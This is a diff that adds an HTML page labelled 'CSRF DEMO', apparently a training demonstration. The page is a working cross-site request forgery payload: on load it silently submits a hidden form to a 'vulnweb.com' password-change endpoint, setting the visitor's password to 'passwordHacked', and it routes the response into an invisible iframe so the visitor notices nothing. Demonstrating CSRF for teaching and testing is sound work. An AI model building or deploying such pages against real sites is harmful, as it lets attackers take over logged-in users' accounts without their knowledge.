@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Document</title>
+    </head>
+    <body onload="document.csrfForm.submit()">
+        <h1>CSRF DEMO</h1>
+        <form action="https://vulnweb.com/account/changePassword" method="POST" target="hiddenFrame" name="csrfForm">
+            <input type="hidden" name="newPassword" value="passwordHacked" />
+
+            <input type="hidden" name="confirmPassword" value="passwordHacked" />
+        </form>
+
+        <iframe name="hiddenFrame" style="display: none" frameborder="0"></iframe>
+    </body>
+</html>
